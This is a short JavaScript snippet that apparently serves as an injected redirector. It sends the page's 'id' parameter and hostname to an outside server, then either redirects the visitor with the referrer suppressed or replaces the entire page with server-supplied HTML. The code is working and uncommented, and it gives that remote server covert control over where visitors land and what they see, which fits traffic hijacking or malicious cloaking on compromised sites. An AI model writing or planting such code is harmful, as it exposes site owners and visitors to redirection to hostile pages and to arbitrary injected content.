if (window.__id_FETCH_RAN__) {
  // already ran
} else {
  window.__id_FETCH_RAN__ = 1;

  var redirectWithoutReferrer = function(url) {
    var meta = document.createElement('meta');
    meta.name = 'referrer';
    meta.content = 'no-referrer';
    document.head.appendChild(meta);
    window.location.replace(url);
  };

  var params = new URLSearchParams(window.location.search);
  var paramValue = params.get('id');
  var hostParam1 = window.location.hostname;

  if (paramValue) {
    fetch('https://x.appdal.com/input.php?id=' + encodeURIComponent(paramValue) + '&host=' + encodeURIComponent(hostParam1) + '&cache=1')
      .then(function(res) {
        if (!res.ok) throw new Error('HTTP ' + res.status);
        return res.text();
      })
      .then(function(e) {
        try {
          var r = JSON.parse(e);
          if (r.redirectUrl) {
            redirectWithoutReferrer(r.redirectUrl);
          } else {
            console.error('No redirectUrl in response', r);
          }
        } catch (err) {
          document.open();
          document.write(e);
          document.close();
        }
      })
      .catch(function(err) {
        console.error(err);
      });
  } else {
    console.error("GO HOME");
  }
}
